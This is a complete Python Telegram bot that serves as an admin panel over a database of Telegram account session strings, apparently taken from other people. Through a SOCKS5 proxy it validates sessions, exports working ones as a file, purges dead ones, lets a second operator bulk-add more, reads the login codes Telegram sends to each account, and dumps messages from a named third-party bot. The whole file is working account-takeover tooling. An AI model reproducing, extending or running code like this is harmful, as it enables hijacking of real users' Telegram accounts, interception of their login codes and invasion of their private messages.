import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest
from phonenumbers import parse, geocoder
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler

# Load .env
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_ID = int(os.getenv("LA_ADMIN_ID"))

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
light_sessions_col = db["light_sessions"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
dp = Dispatcher(bot)

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid == LA_ADMIN_ID

class AccessControlMiddleware(BaseMiddleware):
    async def on_pre_process_message(self, message: types.Message, data: dict):
        user_id = message.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

    async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
        user_id = callback_query.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

# Register middleware
dp.middleware.setup(AccessControlMiddleware())


@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if is_main_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa')
        )
        await message.answer("👑 Welcome, Admin! Choose an action:", reply_markup=keyboard)

    elif is_light_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("🗑 Delete All My Sessions", callback_data='delall')
        )
        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
    else:
        await message.answer("❌ You don't have access to use this bot.")

@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall'])
async def process_callback(callback_query: types.CallbackQuery):
    cmd = callback_query.data
    uid = callback_query.from_user.id

    if cmd == 'log':
        await bot.send_message(uid, "/log")
    elif cmd == 'loger':
        if is_main_admin(uid):
            await bot.send_message(uid, "/loger")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'validel':
        if is_main_admin(uid):
            await bot.send_message(uid, "/validel")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'login':
        await bot.send_message(uid, "Send:\n`/login +1234567890`", parse_mode="Markdown")
    elif cmd == 'fa':
        await bot.send_message(uid, "Send:\n`/fa +1234567890`", parse_mode="Markdown")
    elif cmd == 'addla':
        if is_light_admin(uid):
            await bot.send_message(uid, "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`", parse_mode="Markdown")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'delall':
        if is_light_admin(uid):
            result = light_sessions_col.delete_many({})
            await bot.send_message(uid, f"🗑 Removed your sessions: {result.deleted_count}")
        else:
            await bot.send_message(uid, "❌ Not allowed.")

    await callback_query.answer()

@dp.message_handler(commands=['addla'])
async def add_light_admin_session(message: types.Message):
    if not is_light_admin(message.from_user.id):
        return
    try:
        data = json.loads(message.get_args())
        if not isinstance(data, list):
            raise ValueError("Format must be a JSON list")

        added = 0
        for item in data:
            phone = item.get("phone", "").strip()
            session = item.get("session")
            if phone and session:
                light_sessions_col.update_one(
                    {"phone": phone},
                    {"$set": {"phone": phone, "session": session}},
                    upsert=True
                )
                added += 1
        await message.reply(f"✅ Sessions added: {added}")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
    sessions = list(col.find({}))
    if not sessions:
        await message.answer("❌ No sessions found.")
        return

    await message.answer("🔍 Checking sessions...")
    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                results.append(f"❌ {phone} — Invalid session")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}")
        except Exception as e:
            results.append(f"❌ {phone} — Error: {e}")
        finally:
            await client.disconnect()

    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['loger'])
async def cmd_loger(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return

    sessions = list(sessions_col.find({}))
    valid_sessions = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append({"phone": phone, "session": session_str})
        except:
            pass
        finally:
            await client.disconnect()

    if not valid_sessions:
        await message.answer("❌ No valid sessions.")
        return

    with open("valid_sessions.txt", "w") as f:
        json.dump(valid_sessions, f, indent=2)

    await message.answer_document(open("valid_sessions.txt", "rb"))

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return

    sessions = list(sessions_col.find({}))
    deleted = 0
    for session in sessions:
        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Invalid sessions removed: {deleted}")

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Use format: /login +1234567890")
        return

    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
    session = col.find_one({"phone": args})
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(peer=777000, limit=1, offset_date=None,
                                                 offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        if history.messages:
            await message.reply(f"📨 Last Telegram code:\n\n`{history.messages[0].message}`", parse_mode="Markdown")
        else:
            await message.reply("⚠️ No messages from Telegram.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await client.disconnect()

@dp.message_handler(commands=['fa'])
async def cmd_fa(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Use format: /fa +1234567890")
        return

    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
    session = col.find_one({"phone": args})
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(peer='T686T_bot', limit=25, offset_date=None,
                                                 offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        if not history.messages:
            await message.reply("⚠️ No messages in @T686T_bot.")
            return

        output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages if msg.message])
        await message.reply(f"📤 Last messages from @T686T_bot:\n\n{output}")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await client.disconnect()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
